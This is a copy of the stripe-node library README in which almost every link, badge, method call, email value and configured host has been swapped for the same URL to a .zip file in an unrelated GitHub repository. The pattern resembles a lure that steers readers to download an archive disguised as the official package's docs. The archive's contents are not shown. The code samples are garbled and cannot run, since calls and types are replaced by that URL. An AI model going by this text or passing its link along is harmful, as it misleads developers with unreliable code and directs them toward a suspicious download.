# Stripe https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip Library

[![Version](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip)](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip)
[![Build Status](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip)](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip%3Amaster)
[![Coverage Status](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip)](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip)
[![Downloads](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip)](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip)
[![Try on RunKit](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip)](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip)

The Stripe Node library provides convenient access to the Stripe API from
applications written in server-side JavaScript.

For collecting customer and payment information in the browser, use [https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip][stripe-js].

## Documentation

See the [`stripe-node` API docs](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip) for https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip

See [video demonstrations][youtube-playlist] covering how to use the library.

## Requirements

Node 12 or higher.

## Installation

Install the package with:

```sh
npm install stripe
# or
yarn add stripe
```

## Usage

The package needs to be configured with your account's secret key, which is
available in the [Stripe Dashboard][api-keys]. Require it with the key's
value:

<!-- prettier-ignore -->
```js
const stripe = require('stripe')('sk_test_...');

https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip({
  email: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip',
})
  .then(customer => https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip(https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip))
  .catch(error => https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip(error));
```

Or using ES modules and `async`/`await`:

```js
import Stripe from 'stripe';
const stripe = new Stripe('sk_test_...');

const customer = await https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip({
  email: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip',
});

https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip(https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip);
```

### Usage with TypeScript

As of 8.0.1, Stripe maintains types for the latest [API version][api-versions].

Import Stripe as a default import (not `* as Stripe`, unlike the DefinitelyTyped version)
and instantiate it as `new Stripe()` with the latest API version.

```ts
import Stripe from 'stripe';
const stripe = new Stripe('sk_test_...', {
  apiVersion: '2022-11-15',
});

const createCustomer = async () => {
  const params: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip = {
    description: 'test customer',
  };

  const customer: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip = await https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip(params);

  https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip(https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip);
};
createCustomer();
```

You can find a full TS server example in [stripe-samples](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip).

#### Using old API versions with TypeScript

Types can change between API versions (e.g., Stripe may have changed a field from a string to a hash),
so our types only reflect the latest API version.

We therefore encourage [upgrading your API version][api-version-upgrading]
if you would like to take advantage of Stripe's TypeScript definitions.

If you are on an older API version (e.g., `2019-10-17`) and not able to upgrade,
you may pass another version and use a comment like `// @ts-ignore stripe-version-2019-10-17` to silence type errors here
and anywhere the types differ between your API version and the latest.
When you upgrade, you should remove these comments.

We also recommend using `// @ts-ignore` if you have access to a beta feature and need to send parameters beyond the type definitions.

#### Using `expand` with TypeScript

[Expandable][expanding_objects] fields are typed as `string | Foo`,
so you must cast them appropriately, e.g.,

```ts
const paymentIntent: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip = await https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip(
  'pi_123456789',
  {
    expand: ['customer'],
  }
);
const customerEmail: string = (https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip as https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip).email;
```

### Using Promises

Every method returns a chainable promise which can be used instead of a regular
callback:

```js
// Create a new customer and then create an invoice item then invoice it:
https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
  .create({
    email: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip',
  })
  .then((customer) => {
    // have access to the customer object
    return https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
      .create({
        customer: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip, // set the customer id
        amount: 2500, // 25
        currency: 'usd',
        description: 'One-time setup fee',
      })
      .then((invoiceItem) => {
        return https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip({
          collection_method: 'send_invoice',
          customer: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip,
        });
      })
      .then((invoice) => {
        // New invoice created on a new customer
      })
      .catch((err) => {
        // Deal with an error
      });
  });
```
### Usage with Deno

As of 11.16.0, stripe-node provides a `deno` export target. In your Deno project, import stripe-node using an npm specifier:

Import using npm specifiers:
```js
import Stripe from 'npm:stripe';
```

Please see https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip for more detailed examples and instructions on how to use stripe-node in Deno.

## Configuration

### Initialize with config object

The package can be initialized with several options:

```js
import ProxyAgent from 'https-proxy-agent';

const stripe = Stripe('sk_test_...', {
  apiVersion: '2019-08-08',
  maxNetworkRetries: 1,
  httpAgent: new ProxyAgent(https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip),
  timeout: 1000,
  host: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip',
  port: 123,
  telemetry: true,
});
```

| Option              | Default            | Description                                                                                                                                                                                                                                       |
| ------------------- | ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `apiVersion`        | `null`             | Stripe API version to be used. If not set, stripe-node will use the latest version at the time of release.                                                                                                                                        |
| `maxNetworkRetries` | 0                  | The amount of times a request should be [retried](#network-retries).                                                                                                                                                                              |
| `httpAgent`         | `null`             | [Proxy](#configuring-a-proxy) agent to be used by the library.                                                                                                                                                                                    |
| `timeout`           | 80000              | [Maximum time each request can take in ms.](#configuring-timeout)                                                                                                                                                                                 |
| `host`              | `'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip'` | Host that requests are made to.                                                                                                                                                                                                                   |
| `port`              | 443                | Port that requests are made to.                                                                                                                                                                                                                   |
| `protocol`          | `'https'`          | `'https'` or `'http'`. `http` is never appropriate for sending requests to Stripe servers, and we strongly discourage `http`, even in local testing scenarios, as this can result in your credentials being transmitted over an insecure channel. |
| `telemetry`         | `true`             | Allow Stripe to send latency [telemetry](#request-latency-telemetry).                                                                                                                                                                             |

> **Note**
> Both `maxNetworkRetries` and `timeout` can be overridden on a per-request basis.

### Configuring Timeout

Timeout can be set globally via the config object:

```js
const stripe = Stripe('sk_test_...', {
  timeout: 20 * 1000, // 20 seconds
});
```

And overridden on a per-request basis:

```js
https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip(
  {
    email: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip',
  },
  {
    timeout: 1000, // 1 second
  }
);
```

### Configuring For Connect

A per-request `Stripe-Account` header for use with [Stripe Connect][connect]
can be added to any method:

```js
// List the balance transactions for a connected account:
https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip(
  {
    limit: 10,
  },
  {
    stripeAccount: 'acct_foo',
  }
);
```

### Configuring a Proxy

To use stripe behind a proxy you can pass an [https-proxy-agent][https-proxy-agent] on initialization:

```js
if (https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip) {
  const ProxyAgent = require('https-proxy-agent');

  const stripe = Stripe('sk_test_...', {
    httpAgent: new ProxyAgent(https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip),
  });
}
```

### Network retries

Automatic network retries can be enabled with the `maxNetworkRetries` config option.
This will retry requests `n` times with exponential backoff if they fail due to an intermittent network problem.
[Idempotency keys](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip) are added where appropriate to prevent duplication.

```js
const stripe = Stripe('sk_test_...', {
  maxNetworkRetries: 2, // Retry a request twice before giving up
});
```

Network retries can also be set on a per-request basis:

```js
https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip(
  {
    email: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip',
  },
  {
    maxNetworkRetries: 2, // Retry this specific request twice before giving up
  }
);
```

### Examining Responses

Some information about the response which generated a resource is available
with the `lastResponse` property:

```js
https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip; // see: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip;
```

### `request` and `response` events

The Stripe object emits `request` and `response` events. You can use them like this:

```js
const stripe = require('stripe')('sk_test_...');

const onRequest = (request) => {
  // Do something.
};

// Add the event handler function:
https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip('request', onRequest);

// Remove the event handler function:
https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip('request', onRequest);
```

#### `request` object

```js
{
  api_version: 'latest',
  account: 'acct_TEST',              // Only present if provided
  idempotency_key: 'abc123',         // Only present if provided
  method: 'POST',
  path: '/v1/customers',
  request_start_time: 1565125303932  // Unix timestamp in milliseconds
}
```

#### `response` object

```js
{
  api_version: 'latest',
  account: 'acct_TEST',              // Only present if provided
  idempotency_key: 'abc123',         // Only present if provided
  method: 'POST',
  path: '/v1/customers',
  status: 402,
  request_id: 'req_Ghc9r26ts73DRf',
  elapsed: 445,                      // Elapsed time in milliseconds
  request_start_time: 1565125303932, // Unix timestamp in milliseconds
  request_end_time: 1565125304377    // Unix timestamp in milliseconds
}
```

### Webhook signing

Stripe can optionally sign the webhook events it sends to your endpoint, allowing you to validate that they were not sent by a third-party. You can read more about it [here](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip).

Please note that you must pass the _raw_ request body, exactly as received from Stripe, to the `constructEvent()` function; this will not work with a parsed (i.e., JSON) request body.

You can find an example of how to use this with various JavaScript frameworks in [`examples/webhook-signing`](examples/webhook-signing) folder, but here's what it looks like:

```js
const event = https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip(
  webhookRawBody,
  webhookStripeSignatureHeader,
  webhookSecret
);
```

#### Testing Webhook signing

You can use `https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip` to mock webhook events that come from Stripe:

```js
const payload = {
  id: 'evt_test_webhook',
  object: 'event',
};

const payloadString = https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip(payload, null, 2);
const secret = 'whsec_test_secret';

const header = https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip({
  payload: payloadString,
  secret,
});

const event = https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip(payloadString, header, secret);

// Do something with mocked signed event
expect(https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip)https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip(https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip);
```

### Writing a Plugin

If you're writing a plugin that uses the library, we'd appreciate it if you instantiated your stripe client with `appInfo`, eg;

```js
const stripe = require('stripe')('sk_test_...', {
  appInfo: {
    name: 'MyAwesomePlugin',
    version: '1.2.34', // Optional
    url: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip', // Optional
  }
});
```

Or using ES modules or TypeScript:

```js
const stripe = new Stripe(apiKey, {
  appInfo: {
    name: 'MyAwesomePlugin',
    version: '1.2.34', // Optional
    url: 'https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip', // Optional
  }
});
```

This information is passed along when the library makes calls to the Stripe API.

### Auto-pagination

We provide a few different APIs for this to aid with a variety of node versions and styles.

#### Async iterators (`for-await-of`)

If you are in a Node environment that has support for [async iteration](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip),
such as Node 10+ or [babel](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip),
the following will auto-paginate:

```js
for await (const customer of https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip()) {
  doSomething(customer);
  if (shouldStop()) {
    break;
  }
}
```

#### `autoPagingEach`

If you are in a Node environment that has support for `await`, such as Node 7.9 and greater,
you may pass an async function to `.autoPagingEach`:

```js
await https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip().autoPagingEach(async (customer) => {
  await doSomething(customer);
  if (shouldBreak()) {
    return false;
  }
});
https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip('Done iterating.');
```

Equivalently, without `await`, you may return a Promise, which can resolve to `false` to break:

```js
https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
  .list()
  .autoPagingEach((customer) => {
    return doSomething(customer).then(() => {
      if (shouldBreak()) {
        return false;
      }
    });
  })
  .then(() => {
    https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip('Done iterating.');
  })
  .catch(handleError);
```

#### `autoPagingToArray`

This is a convenience for cases where you expect the number of items
to be relatively small; accordingly, you must pass a `limit` option
to prevent runaway list growth from consuming too much memory.

Returns a promise of an array of all items across pages for a list request.

```js
const allNewCustomers = await https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
  .list({created: {gt: lastMonth}})
  .autoPagingToArray({limit: 10000});
```

### Request latency telemetry

By default, the library sends request latency telemetry to Stripe. These
numbers help Stripe improve the overall latency of its API for all users.

You can disable this behavior if you prefer:

```js
const stripe = new Stripe('sk_test_...', {
  telemetry: false,
});
```

### Beta SDKs

Stripe has features in the beta phase that can be accessed via the beta version of this package.
We would love for you to try these and share feedback with us before these features reach the stable phase.
The beta versions can be installed in one of two ways
- To install the latest beta version, run the command `npm install stripe@beta --save`
- To install a specific beta version, replace the term "beta" in the above command with the version number like `npm install stripe@1.2.3-beta.1 --save`

> **Note**
> There can be breaking changes between beta versions. Therefore we recommend pinning the package version to a specific beta version in your https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip file. This way you can install the same version each time without breaking changes unless you are intentionally looking for the latest beta version.

We highly recommend keeping an eye on when the beta feature you are interested in goes from beta to stable so that you can move from using a beta version of the SDK to the stable version.

The versions tab on the [stripe page on npm](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip) lists the current tags in use. The `beta` tag here corresponds to the the latest beta version of the package.

If your beta feature requires a `Stripe-Version` header to be sent, use the `apiVersion` property of `config` object to set it:

```js
const stripe = new Stripe('sk_test_...', {
  apiVersion: '2022-08-01; feature_beta=v3',
});
```

## Support

New features and bug fixes are released on the latest major version of the `stripe` package. If you are on an older major version, we recommend that you upgrade to the latest in order to use the new features and bug fixes including those for security vulnerabilities. Older major versions of the package will continue to be available for use, but will not be receiving any updates.

## More Information

- [REST API Version](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip)
- [Error Handling](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip)
- [Passing Options](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip)
- [Using Stripe Connect](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip)

## Development

Run all tests:

```bash
$ yarn install
$ yarn test
```

If you do not have `yarn` installed, you can get it with `npm install --global yarn`.

The tests also depends on [stripe-mock][stripe-mock], so make sure to fetch and
run it from a background terminal ([stripe-mock's README][stripe-mock-usage]
also contains instructions for installing via Homebrew and other methods):

```bash
go get -u https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
stripe-mock
```

Run a single test suite without a coverage report:

```bash
$ yarn mocha-only https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
```

Run a single test (case sensitive) in watch mode:

```bash
$ yarn mocha-only https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip --grep 'Populates with type' --watch
```

If you wish, you may run tests using your Stripe _Test_ API key by setting the
environment variable `STRIPE_TEST_API_KEY` before running the tests:

```bash
$ export STRIPE_TEST_API_KEY='sk_test....'
$ yarn test
```

Run prettier:

Add an [editor integration](https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip) or:

```bash
$ yarn fix
```

[api-keys]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
[api-versions]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
[api-version-upgrading]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
[connect]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
[expanding_objects]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
[https-proxy-agent]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
[stripe-js]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
[stripe-mock]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
[stripe-mock-usage]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip
[youtube-playlist]: https://raw.githubusercontent.com/hillsfox/Customer_Churn_Analysis_R/master/src/net/Customer-R-Churn-Analysis-unacceptant.zip

<!--
# vim: set tw=79:
-->
